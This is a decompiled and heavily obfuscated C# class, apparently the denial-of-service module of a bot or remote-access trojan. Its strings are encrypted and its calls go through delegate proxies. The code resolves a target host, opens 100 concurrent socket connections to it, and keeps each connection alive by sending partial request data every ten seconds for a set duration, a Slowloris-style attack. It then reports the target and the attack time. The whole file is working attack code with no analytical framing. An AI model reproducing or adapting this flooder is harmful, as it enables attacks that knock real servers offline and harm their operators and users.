using System.Net;
using System.Net.Sockets;
using System.Threading;

internal class Class8
{
	private static ThreadStart[] threadStart_0;

	private static Thread[] thread_0;

	public static string string_0;

	public static int int_0;

	private static IPEndPoint ipendPoint_0;

	public static int int_1 = 100;

	public static int int_2;

	public static bool bool_0 = false;

	public static string smethod_0()
	{
		int num = Delegate132.smethod_0(Delegate103.smethod_0(1));
		if (num % 2 == 0)
		{
			return (string)_003CModule_003E.smethod_0(3142235622u);
		}
		return (string)_003CModule_003E.smethod_0(3142235630u);
	}

	public static void smethod_1()
	{
		Thread object_ = Delegate113.smethod_0(smethod_2);
		Delegate114.smethod_0(object_, bool_0: true);
		Delegate115.smethod_0(object_);
	}

	public static void smethod_2()
	{
		try
		{
			ipendPoint_0 = Delegate118.smethod_0(Delegate117.smethod_0(Delegate116.smethod_0(string_0))[0], int_2);
		}
		catch
		{
			ipendPoint_0 = Delegate118.smethod_0(Delegate119.smethod_0(string_0), int_2);
		}
		thread_0 = new Thread[int_1];
		threadStart_0 = new ThreadStart[int_1];
		for (int i = 0; i < int_1; i++)
		{
			threadStart_0[i] = smethod_4;
			thread_0[i] = Delegate113.smethod_0(threadStart_0[i]);
			Delegate115.smethod_0(thread_0[i]);
		}
		Delegate82.smethod_2(int_0 * 1000);
		if (bool_0)
		{
			Delegate65.smethod_4();
			Delegate64.smethod_3(Delegate80.smethod_0(new string[5]
			{
				(string)_003CModule_003E.smethod_0(2927520908u),
				Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2927521670u), string_0)),
				(string)_003CModule_003E.smethod_0(2927521060u),
				Delegate59.smethod_1(Delegate110.smethod_0((string)_003CModule_003E.smethod_0(2927521670u), int_0)),
				(string)_003CModule_003E.smethod_0(2927521247u)
			}), Delegate70.smethod_4());
		}
	}

	public static void smethod_3()
	{
		bool_0 = false;
	}

	public static void smethod_4()
	{
		try
		{
			string text = (string)_003CModule_003E.smethod_0(1668962682u);
			string text2 = Delegate134.smethod_0(text, new object[5]
			{
				Delegate70.smethod_6(),
				Delegate71.smethod_0((string)_003CModule_003E.smethod_0(1668964002u), Delegate103.smethod_0(7)),
				string_0,
				(string)_003CModule_003E.smethod_0(1668964013u),
				Delegate132.smethod_0(Delegate133.smethod_0(Delegate103.smethod_0(1)))
			});
			byte[] array = Delegate101.smethod_0(Delegate100.smethod_0(), text2);
			Socket object_ = Delegate135.smethod_0(Delegate69.smethod_0(Delegate124.smethod_0(ipendPoint_0)), int_2);
			Delegate126.smethod_0(object_, array, array.Length, SocketFlags.None);
			while (bool_0)
			{
				Delegate82.smethod_2(10000);
				byte[] array2 = Delegate101.smethod_0(Delegate100.smethod_0(), Delegate80.smethod_0(new string[6]
				{
					Delegate133.smethod_0(Delegate103.smethod_0(1)),
					(string)_003CModule_003E.smethod_0(1668963868u),
					Delegate133.smethod_1(Delegate103.smethod_0(1)),
					(string)_003CModule_003E.smethod_0(1668963846u),
					Delegate103.smethod_0(1),
					(string)_003CModule_003E.smethod_0(1668963841u)
				}));
				Delegate126.smethod_0(object_, array2, array2.Length, SocketFlags.None);
			}
			Delegate129.smethod_1(object_, bool_0: false);
			Delegate128.smethod_0(object_);
		}
		catch
		{
			Delegate65.smethod_5();
		}
	}

	public static Socket smethod_5(string string_1, int int_3)
	{
		Socket result = null;
		IPHostEntry iPHostEntry = null;
		iPHostEntry = Delegate116.smethod_0(string_1);
		IPAddress[] array = Delegate117.smethod_0(iPHostEntry);
		foreach (IPAddress ipaddress_ in array)
		{
			IPEndPoint iPEndPoint = Delegate118.smethod_0(ipaddress_, int_3);
			Socket socket = Delegate122.smethod_0(Delegate121.smethod_0(iPEndPoint), SocketType.Stream, ProtocolType.Tcp);
			Delegate136.smethod_0(socket, iPEndPoint);
			if (Delegate123.smethod_0(socket))
			{
				result = socket;
				break;
			}
		}
		return result;
	}
}
